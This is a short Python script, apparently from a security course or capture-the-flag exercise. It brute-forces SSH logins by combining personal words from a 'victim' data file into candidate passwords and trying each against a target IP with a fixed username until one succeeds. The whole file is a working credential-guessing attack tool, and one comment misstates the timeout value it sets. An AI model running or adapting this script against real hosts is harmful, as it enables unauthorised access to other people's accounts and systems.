import itertools
import paramiko
import sys

def load_victim_data(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def generate_passwords(data):
    passwords = []
    for length in range(1, 4):
        combinations = itertools.permutations(data, length)
        for combo in combinations:
            passwords.append(''.join(combo))
    return passwords

def try_ssh_login(ip, username, password):
    client = None
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(ip, username=username, password=password, timeout=0.5)  # 超時設為 1 秒
        print(f"成功登入！密碼是：{password}")
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"錯誤：{e}")
        return False
    finally:
        if client:
            client.close()

def main():
    victim_ip = sys.argv[1]
    username = 'csc2025'
    victim_data = load_victim_data('/app/victim.dat')
    passwords = generate_passwords(victim_data)

    for password in passwords:
        print(f"正在嘗試密碼：{password}")
        if try_ssh_login(victim_ip, username, password):
            break  # 成功後立即終止
    else:
        print("所有密碼嘗試失敗。")

if __name__ == "__main__":
    main()